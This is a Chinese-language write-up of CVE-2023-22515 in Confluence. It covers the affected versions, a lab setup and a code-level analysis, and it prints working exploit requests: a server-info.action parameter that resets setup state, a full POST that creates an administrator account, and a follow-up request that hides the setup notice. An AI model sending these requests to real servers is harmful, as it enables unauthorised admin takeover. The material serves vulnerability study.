<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/W2etlcCDYu-y79Tih7edRA)

**写在前面**

    Confluence 最近出了一个最新的严重漏洞，其 CVSS 评分为满分 10 分，利用条件低危害等级极高。攻击者可以无条件创建一个管理员账号，众所周知 Confluence 上会有很多敏感信息，甚至是公司内部的台账，这个漏洞很有收集价值。这篇文章有保姆级别环境搭建与漏洞分析、POC 等，感谢 World 师傅投稿分享。

**目录**  

```
0x01 漏洞原理
0x02 影响版本
0x03 环境搭建
0x04 漏洞分析
0x05 参考

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/COplEiag2iapqvSaG8biaTaIGDibDD7UT0E1Fx9rvDc2mmxF0R10xWUwhOtiaIJCicMWXjTdUOs0g58PGlLTKmzaWUsw/640?wx_fmt=jpeg)

**漏洞原理**

CVE-2023-22515 是一个影响 Confluence Server 和 Confluence Data Center 的严重漏洞。

他是一个权限提升漏洞 ， 当然该漏洞也算是一个组合拳漏洞，由未授权加 xwork 框架的一个功能引起，危害为高危，很有意思的一个漏洞。

**影响版本**
--------

```
8.0.0 <= Confluence Data Center and Confluence Server <= 8.0.4
8.1.0 <= Confluence Data Center and Confluence Server <= 8.1.4
8.2.0 <= Confluence Data Center and Confluence Server <= 8.2.3
8.3.0 <= Confluence Data Center and Confluence Server <= 8.3.2
8.4.0 <= Confluence Data Center and Confluence Server <= 8.4.2
8.5.0 <= Confluence Data Center and Confluence Server <= 8.5.1

```

**环境搭建**
--------

这里保姆级环境搭建较长，关注漏洞分析和 POC 的师傅可以直接下拉到**漏洞分析**（大概在文章中部位置）。首先我们需要去官网下载安装环境

```
https://www.atlassian.com/software/confluence/download-archives

```

选择一个版本进行安装 我选择的 8.1.0  

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlxgc7EmQfaOB8nByPnqGicKibSebHviciaELraiag6p9Y9P3XX7RYm0qXNTQ/640?wx_fmt=png)

一路 next，选择 confluence，默认端口

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlgyQXDiaGp1eTDCkEQ9QbuibeU6WGd35CLtDFrhbXXG7XLuuxlIHdmriaw/640?wx_fmt=png)

安装完成会自动打开网页，选择适用  

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlxsFJQOibLUehLC8ZQE8NfRicX7Aeo5OAVvud6gwp7gur05pOZXL4C4AQ/640?wx_fmt=png)

这里点击获取，然后去官网注册个账户，免费试用 9 个月

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxluxv5GE8TXDbkfaib14c2rnKFT7wicSrOXAfkeLMgwQHyf9ANlWSgWsFg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlaSccApklhjQJHvfCO6icib8C74ZGTgzSJpOrj3XXRKic8mzNrNc3iaZB0g/640?wx_fmt=png)

选择单点

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlJdUU5N1rXmscxia82YPPrc1sXesbXpg8IfEnUjcaz0y8RxNEa3Y5e6w/640?wx_fmt=png)

选择 mysql

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlBFtccUdHwLZtm41XEVzWbZ82RypZutOqE4vUxNMmx2FGVgJpibbibiaIw/640?wx_fmt=png)

然后这里需要有一个驱动

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlFcbGAWrOqp2W6riaibl3ibt4ibJ7XhWlSpn0jQzTkUac3A59SNbIGskibTA/640?wx_fmt=png)点击获取点进去

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlxrymZ57Gau7etrSM8NpZxich1D68ag0TMvbRJd9scricakM8mFrJW5qQ/640?wx_fmt=png)

然后这里选择独立于平台，然后下载这个 zip 压缩包

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlXn5MaqkwSYrUW2vwVU4Rw1emg4ibJHAOP3s5dQCw0r5OZpxvWcpIj8w/640?wx_fmt=png)

解压缩后里面有个 jar 包

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxliaxLIgvj5phjaygV9xvIfpkGov4AYUCKmCv0Ilt6VBOQBI0BCMgyh0Q/640?wx_fmt=png)

打开依赖包目录 C:\Program Files\Atlassian\Confluence\confluence\WEB-INF\lib 把这个 jar 包放进去

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlpjpVDribEbmGemNvJo6N6I1RaZPuFMT2o8lkPF6GyWxdgz3h9vV3PcA/640?wx_fmt=png)

然后找到文件夹快捷，然后暂停服务

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxl2woQgq9ZPDH0xvTppZT1mQJh2VXddWHUzLnibT2qiaibiaXic4KHgmm7n5A/640?wx_fmt=png)

启动服务

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlGaDMqyJyEHt6hJlJNLTCfIA5xsbaYTDW1uqhenjqTQX2fVSKFgKMibA/640?wx_fmt=png)

刷新页面

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlQ1KRUMsggDSQKdxP0BOccHX57JmsFqaHKbOJP1dCNxXEvKhXlEFqUg/640?wx_fmt=png)

这里就出来了

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlmNgkDVib6sVfgEEw2hXLAgsoRVlF1lKCnRDELN4EHoYMXPw59eVex9Q/640?wx_fmt=png)

启动一个版本为 8 的数据库，连接数据库

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlnIa3VwBR3Iib1Ez3MhpVxrHj3cwCSbQR9ZJsKbePXPwCYA1u3spSa6Q/640?wx_fmt=png)

一路 next，创建空站点，配置用户管理，管理员信息。然后就可以正常启动了。

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlZwopuvibCGGZRCsfBk62LHblwhYQNlGCgfBXkCTNI8mibOB2pibV3ic2ug/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlCZdicV7PZxibqWn258me4icHrTwaibf1nx60hLpYWiciciakicaYhRhDYWWicCA/640?wx_fmt=png)

**漏洞分析**

这个漏洞需要一些前置知识，Confluence 是建立在 Apache Struts 框架之上的，作为其中的一部分使用了框架。

XWork 框架允许通过 HTTP 请求中提供的 HTTP 参数在 Java 对象上设置参数。这是 Confluence 的一个已知安全问题。简单来说就像 struts2 的 OGNL 表达式漏洞差不多 参考 CVE-2016-4428 都是通过方法. 方法的形式来达到一个调用链的一个效果具体参考

```
https://developer.atlassian.com/server/confluence/xwork-plugin-complex-parameters-and-security/
XWorkPlugin Complex Parameters and Security (atlassian.com)

```

这个漏洞的效果是达到可以创建一个管理员账户信息的一个效果，而这个创建管理员信息则是在安装网站的时候进行创建，访问 / setup/setupadministrator.action 目录则可以进行创建管理员账户

但是我们直接访问这个目录则可以发现返回 Setup is already complete - Confluence 也就说安装程序已完成

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlj1hZ1mgZJWzM4MPeibpV2MiaauYQicDJm0dG2JPCya29gPMTVlGumc4jw/640?wx_fmt=png)

也就是不能直接进行访问然后直接创建，那么我们就可以去看一下代码 然后就发现在 atlassian-confluence-8.1.0/struts.xml 文件下有一个拦截器

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxldrIb7BaGIx8znPRv3lWSIujSrmoV4tGlIYSPguicoxJKr5n2uOzhNpA/640?wx_fmt=png)

而拦截器下面作为检查的一部分将进行测试，已确定服务器是否已完成设置

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlMcTpyVsa4DicpmcH06JLuE9L0OeqYzWN2OfJK2sq5gMiaWQhfHZOn3iaQ/640?wx_fmt=png)

然后进去看一下发现是返回一个布尔值，如果我们可以让这两个其中一个值返回 false，那么我们就可以让网站处在安装未完成的状态。我们就可以通过访问 / setup/setupadministrator.action 目录达到创建管理员账号的目的（上面安装环境的时候设置过了）

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxliaMnOex9HCWeGm72vHgItq5nVhEsyGozg2AByIb87xNicwJhU8Z11dGQ/640?wx_fmt=png)

这里我们需要找到一个未授权的端点，然后通过 xwork 的可以通过 getter. 的方法进行拼接出一个调用链，然后利用这个调用链设置这两的其中一个值为 false，从而达到设置服务器配置的一个效果。

而这个漏洞则是利用的 /server-info.action 端点

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxldQOdyGuaQXRGtk9AyxThHYd9gQNHvVt1HcE2hGWXbEYGvlqGibELtOw/640?wx_fmt=png)

作者是利用了 ServerInfoAction 的父类 ConfluenceActionSupport

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlpcrofLeblAqFYYBwN1uQnAazAk2J9Nh3HibuxFogObSHFicY33A9h48A/640?wx_fmt=png)

在 ConfluenceActionSupport 类下有一个 getter 方法叫 getBootstrapStatusProvider() 这个方法获取了一个 BootstrapStatusProviderImpl 实例

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlYJx63wIWzmria0BUngticRXNllR2shSO7DG6f53hNLbZjGzgF8eShJXg/640?wx_fmt=png)

而在 BootstrapStatusProviderImpl 类下有一个 getApplicationConfig() 方法 这个方法获取了 ApplicationConfig 的实例

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxllRhY24N6TrAQXtXy1CzckqA7zDW32VDC0YyZUAzM2Xs3HBhFfyRXhA/640?wx_fmt=png)

而在 ApplicationConfig 类下面有一个 setter 方法他设置了 setupComplete 的值，那么这个值正是我们刚才在拦截器里面看到的其中的一个值，而我们通过设置这个值为 false 可以达到让网站进入未安装完成的状态

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlasFAqqySq4HLJBHNY1tIOEGUQS00SXe8wUjfckFU5aGPiavECoQHqqA/640?wx_fmt=png)

通过刚才的拦截器方法可以看到这个获取了一个 setupComplete 值用来进行判断

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlssibryOso1UvPXqypUrTRAkfTrXQxLbBicvH0KMPGAqJib6X4GE7ISrDQ/640?wx_fmt=png)

那么我们通过 xwork 的功能把这些方法调用拼接起来

**Payload 1:**

```
/server-info.action?BootstrapStatusProvider.applicationConfig.setupComplete=false

```

**Payload 2:**

```
POST /setup/setupadministrator.action HTTP/1.1 
Host: 192.168.168.129:8090 
Cache-Control: max-age=0 
Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed- exchange;v=b3;q=0.9 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9 
Cookie: JSESSIONID=B3FC576A89A343C219366798C6DA400F 
Connection: close 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 95 
username=user&fullName=user&email=123@qq.comt&password=user&confirm=user&setup-next-button=Next

```

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlUzKC9XcJl9WjASyqkicKBAGjFfb1tFsfzO2o9YgyuzsLgRVM1UMJ86Q/640?wx_fmt=png)

这里看到成功返回 success 也就是访问成功的回显

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlbnOicxZ69icibUZOsyy0IwlUtkCzJXicELnk2Y6zayEEczDiaD6O9ddhQBA/640?wx_fmt=png)

然后我们在直接访问 /setup/setupadministrator.action 目录 传入账号密码进行设置

```
username=user&fullName=user&email=123@qq.comt&password=user&confirm=user&setup-next-button=Next

```

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxlTvmffonHVqEz7q7CtpLTVhh7lJuspLjLbcWFf4cO49AByG3WQTibM2Q/640?wx_fmt=png)

成功设置了管理员账户和密码

![](https://mmbiz.qpic.cn/mmbiz_png/COplEiag2iapoMf1ibmyGZwbcUCx95jPhxl3apvReTwDRwV3bofECiaAu9wRn2icRrT9oPPgKQ4DZJ9v2OYibndao9XA/640?wx_fmt=png)

为了避免向所有用户显示一条消息，指出设置已完成，我们可以向端点发出请求。

```
/setup/finishsetup.action

```

这个漏洞就是由未授权端点然后，使用 xwork 的特性传入参数进行修改服务器配置，使网站进入安装未完成状态，达到添加管理员账户的目的

**参考**

```
https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis

```

**写在最后**

     本人坚决反对利用文章内容进行恶意攻击行为，一切错误行为必将受到惩罚，绿色网络需要靠我们共同维护，推荐大家在了解技术原理的前提下，更好的维护个人信息安全、企业安全、国家安全。

    未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。